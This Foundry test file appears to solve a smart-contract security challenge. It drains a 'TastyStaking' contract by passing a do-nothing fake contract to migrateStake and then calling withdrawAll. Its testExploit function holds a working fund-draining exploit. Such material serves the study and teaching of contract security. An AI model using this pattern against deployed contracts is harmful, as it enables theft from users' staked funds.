// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Utilities} from "../Utilities.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Token} from "../../src/Token.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";
import { TastyStaking } from "../../src/tasty-stake/TastyStaking.sol";

contract FakeTastyStaking {
    function migrateWithdraw(address staker, uint256 amount) external {
      console2.log("kuku epta");
    }
}

contract TastyStakeTest is Test {
  Utilities private utils;

  address payable private attacker;
  address payable private user;

  Token private steak;
  Token private butter;
  TastyStaking private tastyStaking;

  function setUp() public {
    utils = new Utilities();

    address payable[] memory users = utils.createUsers(2);
    attacker = users[0];
    user = users[1];
    vm.label(attacker, "Attacker");
    vm.label(user, "User");

    steak = new Token("STEAK", "STEAK");
    butter = new Token("BUTTER", "BUTTER");

    steak.mint(user, 100_000e18);
    steak.mint(attacker, 1e18);

    butter.mint(address(this), 10_000e18);

    tastyStaking = new TastyStaking(address(steak), address(this));

    // Setting up BUTTER rewards for TastyStaking
    tastyStaking.addReward(address(butter));
    butter.approve(address(tastyStaking), 10_000e18);
    tastyStaking.notifyRewardAmount(address(butter), 10_000e18);

    vm.startPrank(user);
    // Setting up initial amount of STEAK
    steak.approve(address(tastyStaking), type(uint256).max);
    tastyStaking.stakeAll();
    vm.stopPrank();

    // Advance time by an hour
    vm.warp(block.timestamp + 3600);
  }

  function testExploit() public {
    // Exploit start
    vm.startPrank(attacker, attacker);

    FakeTastyStaking fake = new FakeTastyStaking();
    tastyStaking.migrateStake(address(fake), steak.balanceOf(address(tastyStaking)));
    tastyStaking.withdrawAll(true);

    vm.stopPrank();
    // Exploit end

    validate();
  }

  function validate() private {
    assertEq(steak.balanceOf(address(tastyStaking)), 0);
    assertGt(steak.balanceOf(attacker), 100_000e18);
  }
}
